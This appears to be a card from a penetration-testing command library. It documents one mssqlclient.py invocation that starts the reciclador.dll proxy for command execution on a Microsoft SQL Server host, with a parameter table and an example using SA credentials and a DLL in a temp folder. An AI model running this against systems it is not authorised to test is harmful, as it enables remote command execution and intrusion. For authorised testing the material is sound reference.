---
id: 202a16ef-6291-410f-9821-aa183792f0b6
name: mssqlclient-start-reciclador-dll
type: command
executor: bash
data: >-
  python3 mssqlclient.py '$_HOST/$_USERNAME:$_PASSWORD@$_TARGET_IP' -start
  -reciclador '$_DLL_PATH'
output: null
created_at: '2023-04-06T03:56:20.471830+00:00'
updated_at: '2023-04-10T20:36:31.774363+00:00'
platforms:
  - Windows
tags:
  - start
  - proxy
verified: true
validated: true
---

# mssqlclient-start-reciclador-dll

## Command

```bash
python3 mssqlclient.py '$_HOST/$_USERNAME:$_PASSWORD@$_TARGET_IP' -start -reciclador '$_DLL_PATH'
```

## Description

Starts the reciclador.dll proxy for command execution on the MSSQL host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_HOST | SQL Server host | Yes |
| $_USERNAME | SQL username | Yes |
| $_PASSWORD | SQL password | Yes |
| $_TARGET_IP | Target IP | Yes |
| -start | Start mode flag | Yes |
| -reciclador | DLL flag | Yes |
| $_DLL_PATH | DLL path | Yes |

## Examples

### Basic Usage

```bash
python3 mssqlclient.py 'localhost/sa:Password123@192.168.1.100' -start -reciclador 'C:\windows\temp\reciclador.dll'
```

## Expected Output

Proxy started: Active.

## Related

- [[procedures/MSSQL-OLE-Automation-Command-Execution]]
